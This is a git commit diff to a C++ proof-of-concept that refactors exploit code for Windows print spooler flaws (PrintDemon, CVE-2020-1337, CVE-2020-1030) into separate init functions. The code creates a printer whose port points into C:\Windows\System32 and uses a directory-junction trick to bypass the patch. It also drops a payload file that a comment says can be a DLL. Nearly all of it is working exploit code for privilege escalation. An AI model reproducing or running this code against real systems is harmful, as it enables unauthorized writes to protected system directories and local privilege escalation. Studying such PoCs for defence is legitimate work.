3c27b305bfbc61f47d9d0909b79c97ee318e9e7f
Egon <egongalvani@libero.it>
2022-06-22 11:08:51 +0200

    Created init functions

--- PoC/PoC/PoC.cpp
+++ PoC/PoC/PoC.cpp
@@ -11,50 +11,61 @@ struct PrinterExploitInfo {
 		: driverName(driverName), portName(portName), printerName(printerName) {}
 };
 
-int main(int argc, wchar_t* argv[]) {
-
-	bool isRestarted = isAppStartedFromReboot(argc, argv);
-
-	// PrintDemon 
-	/*PrinterExploitInfo printDemonInfo(
+void cve_2020_1337_init(bool isRestarted) {
+	PrinterExploitInfo printDemonInfo(
 		const_cast<wchar_t*>(L"Generic / Text Only"),
 		const_cast<wchar_t*>(L"C:\\Windows\\System32\\malicious.txt"),
 		const_cast<wchar_t*>(L"print_demon"));
 
 	if (!isRestarted) {
-		//bypassPD: creation tmp directory
 		bool isCreatedTmp = CreateDirectoryW(L"C:\\Users\\User\\Desktop\\tmp", NULL);
 		if (!isCreatedTmp) {
 			std::cout << "[-] Tmp dir ERROR :" << GetLastError() << std::endl;
-			system("pause"); 
-			return -1;
+			system("pause");
+			return;
 		}
 		std::cout << "[+] Tmp dir created !\n";
-		
+
+
 		HRESULT driverResult = AddDriver(printDemonInfo.driverName);
 		DWORD portResult = AddPort(printDemonInfo.portName);
 		HANDLE hPrinter = AddPrinter(printDemonInfo.printerName, printDemonInfo.driverName, printDemonInfo.portName);
 		ClosePrinter(hPrinter);
-		
-		//bypassPD: removal tmp dir + creation symbolic link
-		/*bool isRemovedTmp = RemoveDirectoryW(L"C:\\Users\\User\\Desktop\\tmp");
-		
-		if(!isRemovedTmp) {
+
+		bool isRemovedTmp = RemoveDirectoryW(L"C:\\Users\\User\\Desktop\\tmp");
+		if (!isRemovedTmp) {
 			std::cout << "[-] Removed directory ERROR: " << GetLastError();
 			system("pause");
-			return -1;
+			return;
 		}
-
 		std::cout << "[+] Tmp dir correctly removed !\n";
 
-		//createJunction(const_cast<wchar_t*>(L"C:\\Users\\Bob\\Desktop\\tmp"), const_cast<wchar_t*>(L"C:\\Users\\Bob\\Desktop\\program"));
+		// create junction directory
 		system("cmd /c mklink  /J \"C:\\Users\\User\\Desktop\\tmp\" \"C:\\Windows\\System32\"");
 	}
 
+	std::string payload = "Hello, CVE_2020_1337";
+	print_demon(printDemonInfo.printerName, payload, isRestarted);
+}
+
+void print_demon_init(bool isRestarted) {
+	PrinterExploitInfo printDemonInfo(
+		const_cast<wchar_t*>(L"Generic / Text Only"),
+		const_cast<wchar_t*>(L"C:\\Windows\\System32\\malicious.txt"),
+		const_cast<wchar_t*>(L"print_demon"));
+
+	if (!isRestarted) {
+		HRESULT driverResult = AddDriver(printDemonInfo.driverName);
+		DWORD portResult = AddPort(printDemonInfo.portName);
+		HANDLE hPrinter = AddPrinter(printDemonInfo.printerName, printDemonInfo.driverName, printDemonInfo.portName);
+		ClosePrinter(hPrinter);
+	}
+
 	std::string payload = "Hello, PrintDemon";
-	print_demon(printDemonInfo.printerName, payload, isRestarted);*/
-	
-	// cve_2020_1030 
+	print_demon(printDemonInfo.printerName, payload, isRestarted);
+}
+
+void cve_2020_1030_init(bool isRestarted) {
 	PrinterExploitInfo cve_2020_1030Info(
 		const_cast<wchar_t*>(L"Microsoft Print To PDF"),
 		const_cast<wchar_t*>(L"PORTPROMPT:"),
@@ -68,7 +79,18 @@ int main(int argc, wchar_t* argv[]) {
 	}
 	wchar_t* filePath = const_cast<wchar_t*>(L"C:\\Users\\User\\Desktop\\payload.txt"); // can also be .dll 
 	// std::string fileName = "cve_2020_1030.txt"; // file to insert inside C:\Windows\System32\spool\drivers\x64\4
-	cve_2020_1030(cve_2020_1030Info.printerName, filePath, isRestarted); 
+	cve_2020_1030(cve_2020_1030Info.printerName, filePath, isRestarted);
+}
+
+int main(int argc, wchar_t* argv[]) {
+
+	bool isRestarted = isAppStartedFromReboot(argc, argv);
+		
+	// print_demon_init(isRestarted); 
+	// cve_2020_1337_init(isRestarted); 
+	
+	// cve_2020_1030_init(isRestarted); 
+
 
 	system("pause"); 
 	return 0; 
